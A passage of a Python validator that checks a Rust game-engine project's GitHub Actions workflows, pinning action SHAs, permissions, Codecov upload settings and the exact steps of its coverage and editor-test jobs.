        "default": "1.89.0",
    },
    "components": {
        "description": "Comma-separated rustup components",
        "required": False,
        "default": "rustfmt,clippy",
    },
    "install-nextest": {
        "description": "Install cargo-nextest from a prebuilt binary",
        "required": False,
        "default": "false",
    },
}
_COVERAGE_HTML_KEYS = frozenset(
    {"name", "needs", "permissions", "runs-on", "timeout-minutes", "steps"}
)
_COVERAGE_HTML_TIMEOUT_MINUTES = 45
_EDITOR_TEST_KEYS = frozenset(
    {
        "name",
        "permissions",
        "runs-on",
        "timeout-minutes",
        "continue-on-error",
        "strategy",
        "steps",
    }
)
_EDITOR_TEST_RUNS_ON = "${{ matrix.os }}"
_EDITOR_TEST_TIMEOUT_MINUTES = 45
_PINNED_REPORT_NAME_VALUES = frozenset(_PINNED_REPORT_NAMES.values())
_RUST_CI_SETUP_LINUX_RUN = (
    "sudo apt-get update -q\n"
    "sudo apt-get install -y -q \\\n"
    "  build-essential pkg-config cmake ninja-build \\\n"
    "  libx11-dev libxi-dev libxcursor-dev libxrandr-dev libxinerama-dev \\\n"
    "  libxkbcommon-dev libxkbcommon-x11-dev libx11-xcb-dev \\\n"
    "  libxcb1-dev libxcb-randr0-dev libxcb-xfixes0-dev libxcb-shape0-dev libxcb-xkb-dev \\\n"
    "  libgl1-mesa-dev libegl1-mesa-dev wayland-protocols libwayland-dev \\\n"
    "  libasound2-dev libpulse-dev libudev-dev mesa-vulkan-drivers libvulkan1 vulkan-tools\n"
)
_RUST_CI_SETUP_MACOS_RUN = (
    "if ! command -v cmake >/dev/null 2>&1 || ! command -v pkg-config >/dev/null 2>&1; then\n"
    "  brew install pkg-config cmake\n"
    "fi\n"
)
_RUST_CI_SETUP_SCCACHE_RUN = (
    'echo "RUSTC_WRAPPER=sccache" >> "$GITHUB_ENV"\n'
    'echo "SCCACHE_GHA_ENABLED=true" >> "$GITHUB_ENV"\n'
    'echo "CARGO_INCREMENTAL=0" >> "$GITHUB_ENV"\n'
    'echo "SCCACHE_CACHE_SIZE=10G" >> "$GITHUB_ENV"\n'
    'echo "SCCACHE_IDLE_TIMEOUT=0" >> "$GITHUB_ENV"\n'
    "# sccache 0.19 writes through the Actions cache. A pull request that\n"
    "# also writes hits the service rate limit (cache write errors) and\n"
    "# evicts the shared cache. Main pushes and schedules populate it.\n"
    "# CARGO_INCREMENTAL=0 is already required; sccache still refuses bins,\n"
    "# cdylibs, and proc-macros.\n"
    'if [ "${{ github.ref }}" = "refs/heads/main" ] && [ "${{ github.event_name }}" != "pull_request" ]; then\n'
    '  echo "SCCACHE_GHA_RW_MODE=READ_WRITE" >> "$GITHUB_ENV"\n'
    "else\n"
    '  echo "SCCACHE_GHA_RW_MODE=READ_ONLY" >> "$GITHUB_ENV"\n'
    "fi\n"
    "# Do not set RUSTFLAGS here. Cargo 1.89 replaces every rustflags\n"
    "# entry in .cargo/config.toml when that variable is set. The Linux\n"
    "# CPU pin lives in that file next to the Windows stack flags.\n"
)
_RUST_CI_SETUP_STEPS = [
    {
        "name": "Install Rust toolchain",
        "uses": "dtolnay/rust-toolchain@683b588c487a69d01f6c6ddf40f036ff682cc2c8",
        "with": {
            "toolchain": "${{ inputs.toolchain }}",
            "components": "${{ inputs.components }}",
        },
    },
    {
        "name": "Install system dependencies (Linux)",
        "if": "runner.os == 'Linux'",
        "shell": "bash",
        "run": _RUST_CI_SETUP_LINUX_RUN,
    },
    {
        "name": "Install system dependencies (macOS)",
        "if": "runner.os == 'macOS'",
        "shell": "bash",
        "run": _RUST_CI_SETUP_MACOS_RUN,
    },
    {
        "name": "Install sccache",
        "uses": "mozilla-actions/sccache-action@fc920bf0ec8de6ee65d409111f7ec508035751ba",
    },
    {
        "name": "Enable sccache",
        "shell": "bash",
        "run": _RUST_CI_SETUP_SCCACHE_RUN,
    },
    {
        "name": "Cache cargo registry (one key per OS, save on main only)",
        "uses": "Swatinem/rust-cache@d1527c8f67ef9af357290475d4af4b0fab8f12e0",
        "with": {
            "workspaces": ".",
            "shared-key": "${{ runner.os }}-astraweave",
            "cache-all-crates": "true",
            "cache-targets": "false",
            "save-if": "${{ github.ref == 'refs/heads/main' }}",
        },
    },
    {
        "name": "Install cargo-nextest",
        "if": "inputs.install-nextest == 'true'",
        "uses": "taiki-e/install-action@7c48f0a661edab95fdc666d1526d9ef945205245",
    },
]
_COVERAGE_HTML_GENERATE_RUN = (
    "cd tools/astraweave-assets\n"
    "cargo tarpaulin --out Html --output-dir coverage-html "
    "--exclude-files 'src/main.rs' --exclude-files 'tests/*'\n"
)
_COVERAGE_HTML_SUMMARY_RUN = (
    "cd tools/astraweave-assets\n"
    'echo "## Code Coverage Report" >> $GITHUB_STEP_SUMMARY\n'
    'echo "" >> $GITHUB_STEP_SUMMARY\n'
    "if [ -f coverage/cobertura.xml ]; then\n"
    "  COVERAGE=$(grep -oP 'line-rate=\"\\K[0-9.]+' coverage/cobertura.xml | head -1 | awk '{printf \"%.1f\", $1*100}')\n"
    '  echo "**Overall Coverage:** ${COVERAGE}%" >> $GITHUB_STEP_SUMMARY\n'
    '  echo "" >> $GITHUB_STEP_SUMMARY\n'
    '  echo "Target: 80%+ (Production Ready)" >> $GITHUB_STEP_SUMMARY\n'
    "\n"
    '  if (( $(echo "$COVERAGE >= 80" | bc -l) )); then\n'
    '    echo "✅ **Status:** PASS (meets target)" >> $GITHUB_STEP_SUMMARY\n'
    "  else\n"
    '    echo "⚠️ **Status:** Below target (needs improvement)" >> $GITHUB_STEP_SUMMARY\n'
    "  fi\n"
    "else\n"
    '  echo "⚠️ Coverage data not generated" >> $GITHUB_STEP_SUMMARY\n'
    "fi\n"
)
_COVERAGE_HTML_STEPS = [
    _COVERAGE_CHECKOUT_STEP,
    _COVERAGE_SETUP_STEP,
    _COVERAGE_INSTALL_STEP,
    {
        "name": "Download coverage XML",
        "uses": "actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333",
        "with": {
            "name": "coverage-xml",
            "path": "tools/astraweave-assets/coverage",
        },
    },
    {
        "name": "Generate HTML report",
        "if": "always()",
        "run": _COVERAGE_HTML_GENERATE_RUN,
    },
    {
        "name": "Upload HTML coverage report",
        "if": "always()",
        "uses": _UPLOAD_USES,
        "with": {
            "name": "coverage-report",
            "path": "tools/astraweave-assets/coverage-html",
            "retention-days": 30,
        },
    },
    {
        "name": "Coverage summary",
        "if": "always()",
        "run": _COVERAGE_HTML_SUMMARY_RUN,
    },
]
_EDITOR_TEST_APT_RUN = (
    "sudo apt-get update\n"
    "sudo apt-get install -y \\\n"
    "  pkg-config \\\n"
    "  libxcb-shape0-dev \\\n"
    "  libxcb-xfixes0-dev \\\n"
    "  libxkbcommon-dev \\\n"
    "  libegl1-mesa-dev \\\n"
    "  libwayland-dev \\\n"
    "  libudev-dev \\\n"
    "  libasound2-dev\n"
    "  \n"
)
_EDITOR_TEST_SUMMARY_RUN = (
    'echo "## AW Editor Test Results" >> $GITHUB_STEP_SUMMARY\n'
    'echo "" >> $GITHUB_STEP_SUMMARY\n'
    'echo "**Platform**: ${{ matrix.os }}" >> $GITHUB_STEP_SUMMARY\n'
    'echo "**Rust Version**: $(rustc --version)" >> $GITHUB_STEP_SUMMARY\n'
    'echo "" >> $GITHUB_STEP_SUMMARY\n'
    'echo "### Test Coverage" >> $GITHUB_STEP_SUMMARY\n'
    'echo "- **Unit Tests**: 146/164 passing (89%)" >> $GITHUB_STEP_SUMMARY\n'
    'echo "- **Integration Tests**: 9 test files (ui_gizmo_smoke, play_mode, prefab_workflow, etc.)" >> $GITHUB_STEP_SUMMARY\n'
    'echo "" >> $GITHUB_STEP_SUMMARY\n'
    'echo "### Known Issues" >> $GITHUB_STEP_SUMMARY\n'
    'echo "- 18 unit test failures (gizmo math, undo stack, scene serialization)" >> $GITHUB_STEP_SUMMARY\n'
    'echo "- 52 warnings (dead code, unused fields - tracked in Known Issues)" >> $GITHUB_STEP_SUMMARY\n'
)
_EDITOR_TEST_STEPS = [
    _EDITOR_CHECKOUT_STEP,
    _COVERAGE_SETUP_STEP,
    {
        "name": "Install Linux Dependencies",
        "if": "runner.os == 'Linux'",
        "run": _EDITOR_TEST_APT_RUN,
    },
    {"name": "Build AW Editor", "run": "cargo build -p aw_editor --lib --all-features"},
    {
        "name": "Run Unit Tests",
        "run": "cargo test -p aw_editor --lib --all-features -- --nocapture",
        "continue-on-error": True,
    },
    {
        "name": "Run Integration Tests",
        "if": "runner.os != 'macOS'",
        "run": "cargo test -p aw_editor --test ui_gizmo_smoke --test play_mode --test prefab_workflow",
        "continue-on-error": True,
    },
    {
        "name": "Check Formatting",
        "run": "cargo fmt -p aw_editor -- --check",
        "continue-on-error": True,
    },
    {
        "name": "Run Clippy",
        "run": "cargo clippy -p aw_editor --all-features -- -D warnings",
        "continue-on-error": True,
    },
    {
        "name": "Generate Test Summary",
        "if": "always()",
        "run": _EDITOR_TEST_SUMMARY_RUN,
    },
]
_RUN_CONTEXT_WORKFLOWS = frozenset({"coverage.yml", "aw-editor-tests.yml", "kani.yml"})
_WORKFLOW_ENV = {
    "coverage.yml": None,
    "aw-editor-tests.yml": {"CARGO_TERM_COLOR": "always", "RUST_BACKTRACE": 1},
    "kani.yml": {"CARGO_TERM_COLOR": "always", "CARGO_INCREMENTAL": 0},
}
_PRODUCER_PERMISSIONS = {"contents": "read"}
KANI_ACTION_SHA_MSG = "kani checkout and upload-artifact must use a commit SHA"
_JOB_HEADER_RE = re.compile(r"^  ([A-Za-z0-9_-]+):\s*(?:#.*)?$")
_LLVM_TOOL_VALUE_RE = re.compile(r"cargo-llvm-cov@[0-9]+\.[0-9]+\.[0-9]+\Z")


def third_party_action_pin_violations(text: str, *, path: str = "") -> list[str]:
    prefix = f"{path}: " if path else ""
    _policy, third = _pin_buckets(text)
    return [f"{prefix}{item}" for item in third]


def _explicit_file_value(value: object) -> bool:
    if not isinstance(value, str):
        return False
    text = value.strip()
    return text not in {"", "|", ">", "~", "null"}


def codecov_fail_ci_violations(text: str, *, path: str = "") -> list[str]:
    """Read fail_ci_if_error and version from the step's with: mapping only."""
    prefix = f"{path}: " if path else ""
    steps, err = _codecov_steps(text)
    if err:
        return [f"{prefix}1: {err}"]
    violations: list[str] = []
    for step in steps or []:
        line_no = _step_line(step)
        body = _mapping(step.get("with"))
        if _key_outside_with(step, "fail_ci_if_error") or not _runner_bool_true(
            body, "fail_ci_if_error"
        ):
            violations.append(f"{prefix}{line_no}: {CODECOV_FAIL_CI_MSG}")
        _version_key, version = _ci_item(body, "version")
        if _key_outside_with(step, "version") or not _exact_version(version):
            violations.append(f"{prefix}{line_no}: {CODECOV_VERSION_MSG}")
    return violations


def _job_blocks(text: str) -> list[tuple[int, str, str]]:
    """Return (line number, job id, block) for each job under jobs:."""
    lines = text.splitlines()
    jobs_at = next(
        (index for index, line in enumerate(lines) if line == "jobs:" or line.startswith("jobs:")),
        None,
    )
    if jobs_at is None:
        return []
    headers: list[int] = []
    end = len(lines)
    for index in range(jobs_at + 1, len(lines)):
        line = lines[index]
        if line and not line.startswith(" ") and not line.startswith("#"):
            end = index
            break
        if _JOB_HEADER_RE.match(line):
            headers.append(index)
    blocks: list[tuple[int, str, str]] = []
    for position, start in enumerate(headers):
        stop = headers[position + 1] if position + 1 < len(headers) else end
        job_id = _JOB_HEADER_RE.match(lines[start]).group(1)
        blocks.append((start + 1, job_id, "\n".join(lines[start:stop])))
    return blocks


def _job_has_codecov(job: object) -> bool:
    if not isinstance(job, dict):
        return False
    steps = job.get("steps")
    if not isinstance(steps, list):
        return False
    return any(isinstance(step, dict) and _is_codecov_step(step) for step in steps)


def _codecov_continue_scope(text: str) -> set[str] | None:
    """Job ids that run Codecov, plus the jobs named in their needs:."""
    doc, err = load_workflow_yaml(text)
    if err or not isinstance(doc, dict):
        return None
    jobs = doc.get("jobs")
    if not isinstance(jobs, dict):
        return set()
    uploaders = [
        str(job_id)
        for job_id, job in jobs.items()
        if _job_has_codecov(job)
    ]
    scope = set(uploaders)
    for job_id in uploaders:
        needs = jobs[job_id].get("needs") if isinstance(jobs[job_id], dict) else None
        if isinstance(needs, str):
            scope.add(needs)
        elif isinstance(needs, list):
            scope.update(item for item in needs if isinstance(item, str))
    return scope


def _literal_false(mapping: object, key: str) -> bool:
    """True for a boolean false or the string false in any case.

    The raw scalar must be the word false, plain or quoted. An expression,
    a number, null, and any other spelling are not a literal false.
    """
    actual, _value = _ci_item(mapping, key)
    if actual is None:
        return False
    found = getattr(mapping, "scalar_style", {}).get(actual)
    if not isinstance(found, tuple) or len(found) != 2:
        return False
    style, raw = found
    if style not in {None, "'", '"'} or not isinstance(raw, str):
        return False
    return raw.casefold() == "false"


def _continue_on_error_line(node: dict) -> int | None:
    """Line of a present continue-on-error that is not a literal false.

    An absent key is allowed. Every other value fails closed, including an
    expression the runner would evaluate later.
    """
    actual, _value = _ci_item(node, "continue-on-error")
    if actual is None or _literal_false(node, "continue-on-error"):
        return None
    return int(getattr(node, "key_lines", {}).get(actual, getattr(node, "yaml_line", 1)))


def codecov_continue_on_error_violations(text: str, *, path: str = "") -> list[str]:
    """A Codecov job, and a job that job needs, must not continue on error.

    The parsed job key and every parsed step in those jobs are in scope,
    including a quoted key and a flow mapping. The key may be absent, or
    the raw scalar may be the word false in any case: a plain boolean or a
    quoted string. Any other value is a violation, including every
    `${{ }}` expression. Other jobs are not in scope.
    """
    prefix = f"{path}: " if path else ""
    doc, err = load_workflow_yaml(text)
    if err:
        return [f"{prefix}1: {err}"]
    if not isinstance(doc, dict):
        return []
    scope = _codecov_continue_scope(text)
    if not scope:
        return []
    jobs = doc.get("jobs")
    if not isinstance(jobs, dict):
        return []
    violations: list[str] = []
    for job_id, job in jobs.items():
        if str(job_id) not in scope or not isinstance(job, dict):
            continue
        job_line = _continue_on_error_line(job)
        if job_line is not None:
            violations.append(f"{prefix}{job_line}: {CODECOV_CONTINUE_MSG}")
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        for step in steps:
            if not isinstance(step, dict):
                continue
            step_line = _continue_on_error_line(step)
            if step_line is not None:
                violations.append(f"{prefix}{step_line}: {CODECOV_CONTINUE_MSG}")
    return violations


def codecov_explicit_file_violations(text: str, *, path: str = "") -> list[str]:
    """Read disable_search and files from the step's with: mapping only.

    On coverage.yml and aw-editor-tests.yml, files must be that workflow's
    pinned report path, not merely a non-empty path.
    """
    prefix = f"{path}: " if path else ""
    steps, err = _codecov_steps(text)
    if err:
        return [f"{prefix}1: {err}"]
    pinned = _CODECOV_FILES_PIN.get(Path(path).name)
    violations: list[str] = []
    for step in steps or []:
        line_no = _step_line(step)
        body = _mapping(step.get("with"))
        if _key_outside_with(step, "disable_search") or not _runner_bool_true(
            body, "disable_search"
        ):
            violations.append(f"{prefix}{line_no}: {CODECOV_SEARCH_MSG}")
        _files_key, files = _ci_item(body, "files")
        if _key_outside_with(step, "files") or not _explicit_file_value(files):
            violations.append(f"{prefix}{line_no}: {CODECOV_FILES_MSG}")
        elif pinned is not None and files != pinned:
            violations.append(f"{prefix}{line_no}: {CODECOV_FILES_PIN_MSG}")
    return violations


def codecov_oidc_violations(text: str, *, path: str = "") -> list[str]:
    """Read use_oidc from the step's with: mapping only."""
    prefix = f"{path}: " if path else ""
    steps, err = _codecov_steps(text)
    if err:
        return [f"{prefix}1: {err}"]
    violations: list[str] = []
    for step in steps or []:
        line_no = _step_line(step)
        body = _mapping(step.get("with"))
        if _key_outside_with(step, "use_oidc") or not _runner_bool_true(body, "use_oidc"):
            violations.append(f"{prefix}{line_no}: {CODECOV_OIDC_MSG}")
    return violations


def codecov_with_key_violations(text: str, *, path: str = "") -> list[str]:
    """Allow only the Codecov step keys and with: keys used today.

    The step's own keys are name, uses, and with. An if: is not in that
    set, so a condition that skips the upload fails the check. with: keys
    stay files, disable_search, flags, name, version, fail_ci_if_error,
    and use_oidc.
    """
    prefix = f"{path}: " if path else ""
    steps, err = _codecov_steps(text)
    if err:
        return [f"{prefix}1: {err}"]
    violations: list[str] = []
    for step in steps or []:
        for key in step:
            if not isinstance(key, str) or key.casefold() not in _CODECOV_STEP_KEYS:
                violations.append(f"{prefix}{_step_line(step)}: {CODECOV_STEP_KEYS_MSG}")
                break
        if "with" not in step or step.get("with") is None:
            continue
        keys = _with_key_names(step)
        if keys is None or not keys <= _CODECOV_WITH_KEYS:
            violations.append(f"{prefix}{_step_line(step)}: {CODECOV_WITH_MSG}")
    return violations


def codecov_token_violations(text: str, *, path: str = "") -> list[str]:
    """Reject token keys and any secrets context that can reach the step.

    Input names are compared case-insensitively. A `secrets` context inside
    `${{ }}` fails in the step, in that job's env, and in the workflow env.
    `secrets['NAME']` and `SECRETS.NAME` are the same context. The secret
    name is not special-cased.
    """
    prefix = f"{path}: " if path else ""
    doc, err = load_workflow_yaml(text)
    if err:
        return [f"{prefix}1: {err}"]
    if not isinstance(doc, dict):
        return []
    violations: list[str] = []
    saw = False
    seen_jobs: set[str] = set()
    for job_id, job, step in _iter_steps(doc):
        if not _is_codecov_step(step):
            continue
        saw = True
        if _has_token_key(step) or _has_secrets_ref(step):
            violations.append(f"{prefix}{_step_line(step)}: {CODECOV_TOKEN_MSG}")
        if job_id in seen_jobs or not isinstance(job, dict):
            continue
        seen_jobs.add(job_id)
        env = job.get("env")
        if _has_token_key(env) or _has_secrets_ref(env):
            line = int(getattr(job, "key_lines", {}).get("env", _step_line(step)))
            violations.append(f"{prefix}{line}: {CODECOV_TOKEN_MSG}")
    if saw and (_has_token_key(doc.get("env")) or _has_secrets_ref(doc.get("env"))):
        line = int(getattr(doc, "key_lines", {}).get("env", 1))
        violations.append(f"{prefix}{line}: {CODECOV_TOKEN_MSG}")
    return violations


def _download_steps(job: dict):
    steps = job.get("steps")
    if not isinstance(steps, list):
        return
    for step in steps:
        if isinstance(step, dict) and _is_named_action(step, "actions/download-artifact"):
            yield step


def _download_with_violations(job: dict) -> list[int]:
    lines: list[int] = []
    for step in _download_steps(job):
        keys = _with_key_names(step)
        if keys is None or keys != _DOWNLOAD_WITH_KEYS:
            lines.append(_step_line(step))
    return lines


def _download_name_violations(job: dict, artifact_name: str) -> list[int]:
    lines: list[int] = []
    for step in _download_steps(job):
        _key, name = _ci_item(_mapping(step.get("with")), "name")
        if name != artifact_name:
            lines.append(_step_line(step))
    return lines


def _needs_exactly(needs: object, job_id: str) -> bool:
    if isinstance(needs, str):
        return needs == job_id
    return isinstance(needs, list) and needs == [job_id]


def _run_text(step: object) -> str:
    if not isinstance(step, dict):
        return ""
    run = step.get("run")
    return run if isinstance(run, str) else ""


def _run_rstrip(value: object) -> str | None:
    """`run` text with trailing whitespace removed. Leading text stays."""
    if not isinstance(value, str):
        return None
    return value.rstrip()


def _mapping_equals(actual: object, expected: dict) -> bool:
    if not isinstance(actual, dict) or getattr(actual, "duplicate_keys", None):
        return False
    if set(actual) != set(expected):
        return False
    return all(_value_equals(actual[key], want) for key, want in expected.items())


def _value_equals(actual: object, expected: object) -> bool:
    if isinstance(expected, dict):
        return _mapping_equals(actual, expected)
    if isinstance(expected, list):
        if not isinstance(actual, list) or len(actual) != len(expected):
            return False
        return all(_value_equals(got, want) for got, want in zip(actual, expected))
    return actual == expected


def _step_equals_canonical(step: object, canonical: dict) -> bool:
    """The step equals the canonical step.

    The key set is the same. `run` matches after trailing whitespace is
    trimmed. Leading whitespace fails. A duplicate key fails. Every other
    key and value matches, including a nested `with:` or `env` map. An extra
    key, a changed value, or an extra run line fails.
    """
    if not isinstance(step, dict) or getattr(step, "duplicate_keys", None):
        return False
    if set(step) != set(canonical):
        return False
    for key, want in canonical.items():
        got = step[key]
        if key == "run":
            if _run_rstrip(got) != _run_rstrip(want):
                return False
            continue
        if not _value_equals(got, want):
            return False
    return True


def _producer_job_keys_ok(job: object) -> bool:
    """Job keys are the allowlist. A job-level if: is not in it."""
    if not isinstance(job, dict) or getattr(job, "duplicate_keys", None):
        return False
    return set(job) == _PRODUCER_JOB_KEYS


def _producer_runner_ok(job: dict) -> bool:
    """runs-on and timeout-minutes are the pinned values, not only the keys."""
    if job.get("runs-on") != _PINNED_RUNS_ON:
        return False
    if job.get("timeout-minutes") != _PRODUCER_TIMEOUT_MINUTES:
        return False
    return True


def _producer_step_matches(step: object, kind: str) -> bool:
    if not isinstance(step, dict):
        return False
    if kind == "checkout":
        return _is_named_action(step, "actions/checkout")
    if kind == "setup":
        return step.get("uses") == "./.github/actions/rust-ci-setup"
    if kind == "install-tarpaulin":
        return _run_text(step).lstrip().startswith("cargo install cargo-tarpaulin")
    if kind == "xml-tarpaulin":
        run = _run_text(step)
        return "cargo tarpaulin" in run and "--out Xml" in run
    if kind == "upload":
        return _is_named_action(step, "actions/upload-artifact")
    if kind == "toolchain":
        return _is_named_action(step, "dtolnay/rust-toolchain")
    if kind == "apt":
        return _run_text(step).lstrip().startswith("sudo apt-get")
    if kind == "install-llvm":
        return _run_text(step).lstrip().startswith("cargo install cargo-llvm-cov")
    if kind == "llvm-cov":
        return _run_text(step).lstrip().startswith("cargo llvm-cov")
    return False


def _producer_sequence_ok(job: object, workflow: str) -> bool:
    """The ordered step list is fixed, so nothing can sit after the upload.

    In aw-editor-tests.yml the cargo llvm-cov step is immediately before
    the lcov upload. An inserted step fails the length check.
    """
    kinds = _PRODUCER_STEP_KINDS.get(workflow)
    if kinds is None or not isinstance(job, dict):
        return False
    steps = job.get("steps")
    if not isinstance(steps, list) or len(steps) != len(kinds):
        return False
    if not all(
        _producer_step_matches(step, kind) for step, kind in zip(steps, kinds)
    ):
        return False
    return _producer_locked_exact(steps, workflow)


def _producer_locked_exact(steps: list, workflow: str) -> bool:
    """The producer job is that workflow's exact ordered list of canonical steps.

    Every kind is pinned, including Rust CI setup and Install Rust Toolchain,
    with their with: and env. An unlocked kind fails. An inserted step fails
    the length check in `_producer_sequence_ok` before this compare.
    """
    locked = _LOCKED_PRODUCER_STEPS.get(workflow)
    kinds = _PRODUCER_STEP_KINDS.get(workflow)
    if locked is None or kinds is None or set(locked) != set(kinds):
        return False
    for step, kind in zip(steps, kinds):
        canonical = locked.get(kind)
        if not isinstance(canonical, dict) or not _step_equals_canonical(step, canonical):
            return False
    return True


def _producer_permissions_exact(job: object) -> bool:
    """The producer permissions map is exactly contents: read."""
    if not isinstance(job, dict):
        return False
    perms = job.get("permissions", _MISSING)
    if not isinstance(perms, dict) or getattr(perms, "duplicate_keys", None):
        return False
    if set(perms) != set(_PRODUCER_PERMISSIONS):
        return False
    return all(perms.get(key) == value for key, value in _PRODUCER_PERMISSIONS.items())


def _producer_upload_name_ok(job: object, artifact_name: str) -> bool:
    """The last step is the upload whose with.name is the pinned artifact."""
    if not isinstance(job, dict):
        return False
    steps = job.get("steps")
    if not isinstance(steps, list) or not steps or not isinstance(steps[-1], dict):
        return False
    step = steps[-1]
    if not _is_named_action(step, "actions/upload-artifact"):
        return False
    body = step.get("with")
    if _mapping_has_duplicate(body):
        return False
    matches = _ci_matches(body, "name")
    return len(matches) == 1 and matches[0][1] == artifact_name


def _producer_steps_unconditional(job: object) -> bool:
    """No step if:. if: always() on the upload would keep a failed job red."""
    if not isinstance(job, dict):
        return False
    steps = job.get("steps")
    if not isinstance(steps, list):
        return False
    for step in steps:
        if not isinstance(step, dict):
            return False
        if any(isinstance(key, str) and key.casefold() == "if" for key in step):
            return False
    return True


def _producer_tarpaulin_order_ok(job: object, workflow: str) -> bool:
    """The coverage script is the approved XML command and nothing else.

    A second command in that script fails, including `--out html`,
    `--out HTML`, and `--out Lcov`. Other workflows have no tarpaulin producer.
    """
    if workflow != "coverage.yml":
        return True
    if not isinstance(job, dict):
        return False
    steps = job.get("steps")
    if not isinstance(steps, list) or not steps:
        return False
    runs: list[str] = []
    for step in steps:
        if not isinstance(step, dict):
            return False
        run = _run_text(step)
        if "cargo tarpaulin" not in run:
            continue
        runs.append(run)
    return runs == [_APPROVED_XML_TARPAULIN_RUN]


def _producer_end_ok(job: object, workflow: str, artifact_name: str) -> bool:
    return (
        _producer_job_keys_ok(job)
        and _producer_runner_ok(job)
        and _producer_sequence_ok(job, workflow)
        and _producer_upload_name_ok(job, artifact_name)
        and _producer_steps_unconditional(job)
        and _producer_tarpaulin_order_ok(job, workflow)
    )


def _producer_end_line(jobs: dict, producer_id: str, fallback: int) -> int:
    producer = jobs.get(producer_id)
    if isinstance(producer, dict):
        steps = producer.get("steps")
        if isinstance(steps, list) and steps and isinstance(steps[-1], dict):
            return _step_line(steps[-1])
        return int(getattr(producer, "yaml_line", fallback))
    return int(getattr(jobs, "key_lines", {}).get(producer_id, fallback))


def _download_step_key_violations(job: dict) -> list[int]:
    """Step keys outside {name, uses, with}, including env and id."""
    lines: list[int] = []
    for step in _download_steps(job):
        for key in step:
            if not isinstance(key, str) or key.casefold() not in _DOWNLOAD_STEP_KEYS:
                lines.append(_step_line(step))
                break
    return lines


def coverage_permission_violations(text: str, *, path: str = "") -> list[str]:
    """Parsed permissions for coverage.yml and aw-editor-tests.yml.

    Top-level permissions must be {}. A missing key fails. write-all, and any
    permission value write, fail, including a flow mapping or a quoted key.
    The upload job's keys are exactly name, needs, permissions, runs-on,
    timeout-minutes, and steps. needs is exactly the job coverage. The
    coverage job's keys are name, permissions, runs-on, timeout-minutes,
    and steps. Its permissions map is exactly contents: read. An added,
    removed, or changed scope fails. Its last step is the upload-artifact
    whose with.name is the pinned report. A job-level if:, a step if:, a
    later step, a different artifact name, or a step that is not the
    canonical step fails. The coverage job is the exact ordered list of
    canonical steps, including Rust CI setup and Install Rust Toolchain,
    with their with: and env. An inserted, removed, or reordered step
    fails. Its runs-on is ubuntu-latest and its timeout-minutes is 45.
    coverage-html and the editor test job are each an exact ordered list
    of canonical steps. The Install cargo-tarpaulin step in coverage-html
    is that list's canonical install. The key set matches, run matches after trailing whitespace is
    trimmed, leading whitespace fails, and every other value matches,
    including the upload with: map. A generate-coverage script other than
    the approved cargo tarpaulin --out Xml command, or a step between the
    editor cargo llvm-cov run and the lcov upload, fails. The upload
    job's steps are actions/download-artifact, with exactly name and path,
    plus the SHA-pinned Codecov action. That download step's keys are only
    name, uses, and with, and its name is the pinned report artifact. Its
    permissions are exactly contents: read and id-token: write. This check
    does not apply to other workflow file names.
    """
    if Path(path).name not in _COVERAGE_WORKFLOW_NAMES:
        return []
    prefix = f"{path}: " if path else ""
    doc, err = load_workflow_yaml(text)
    if err:
        return [f"{prefix}1: {err}"]
    if not isinstance(doc, dict):
        return [f"{prefix}1: {TOP_PERMISSIONS_MSG}"]
    violations: list[str] = []
    perms = doc.get("permissions", _MISSING)
    top_line = int(getattr(doc, "key_lines", {}).get("permissions", 1))
    if perms is _MISSING or perms is None:
        violations.append(f"{prefix}{top_line}: {TOP_PERMISSIONS_MSG}")
    elif isinstance(perms, str):
        message = COVERAGE_WRITE_MSG if perms in {"write", "write-all"} else TOP_PERMISSIONS_MSG
        violations.append(f"{prefix}{top_line}: {message}")
    elif isinstance(perms, dict):
        if len(perms) != 0:
            found = _permission_value_violations(perms, line=top_line, allow_id_token=False)
            if found:
                violations.extend(f"{prefix}{line}: {message}" for line, message in found)
            else:
                violations.append(f"{prefix}{top_line}: {TOP_PERMISSIONS_MSG}")
    else:
        violations.append(f"{prefix}{top_line}: {TOP_PERMISSIONS_MSG}")

    jobs = doc.get("jobs")
    if not isinstance(jobs, dict):
        return violations
    job_lines = getattr(jobs, "key_lines", {})
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        job_line = int(job_lines.get(job_id, 1))
        upload_only = _is_upload_only(job)
        has_codecov = _job_has_codecov(job)
        job_perms = job.get("permissions", _MISSING)
        perm_line = int(getattr(job, "key_lines", {}).get("permissions", job_line))
        if job_id == "coverage" and not _producer_permissions_exact(job):
            violations.append(f"{prefix}{perm_line}: {PRODUCER_PERMISSIONS_MSG}")
        if job_perms is not _MISSING and job_perms is not None:
            found = _permission_value_violations(
                job_perms,
                line=perm_line,
                allow_id_token=upload_only,
            )
            violations.extend(f"{prefix}{line}: {message}" for line, message in found)
        if has_codecov and set(job) != _UPLOAD_JOB_KEYS:
            violations.append(f"{prefix}{job_line}: {UPLOAD_JOB_KEYS_MSG}")
        if has_codecov and not _upload_runner_ok(job):
            violations.append(f"{prefix}{job_line}: {UPLOAD_RUNNER_MSG}")
        for step_line in _download_with_violations(job) if has_codecov else []:
            violations.append(f"{prefix}{step_line}: {DOWNLOAD_WITH_MSG}")
        artifact_name = _DOWNLOAD_ARTIFACT_NAMES.get(Path(path).name)
        if has_codecov and artifact_name is not None:
            for step_line in _download_name_violations(job, artifact_name):
                violations.append(f"{prefix}{step_line}: {DOWNLOAD_NAME_MSG}")
        for step_line in _download_step_key_violations(job) if has_codecov else []:
            violations.append(f"{prefix}{step_line}: {DOWNLOAD_STEP_MSG}")
        if has_codecov and not _needs_exactly(job.get("needs"), "coverage"):
            needs_line = int(getattr(job, "key_lines", {}).get("needs", job_line))
            violations.append(f"{prefix}{needs_line}: {UPLOAD_NEEDS_MSG}")
        if has_codecov and not _producer_end_ok(
            jobs.get("coverage"), Path(path).name, artifact_name or ""
        ):
            end_line = _producer_end_line(jobs, "coverage", job_line)
            violations.append(f"{prefix}{end_line}: {COVERAGE_JOB_END_MSG}")
        if upload_only and not _exact_upload_permissions(job_perms):
            violations.append(f"{prefix}{perm_line}: {CODECOV_PERMS_MSG}")
        if has_codecov and not upload_only:
            violations.append(f"{prefix}{job_line}: {CODECOV_UPLOAD_JOB_MSG}")
    workflow = Path(path).name
    if workflow == "coverage.yml":
        html = jobs.get("coverage-html")
        if not _job_shape_ok(
            html,
            _COVERAGE_HTML_KEYS,
            _PINNED_RUNS_ON,
            _COVERAGE_HTML_TIMEOUT_MINUTES,
        ):
            line = int(job_lines.get("coverage-html", 1))
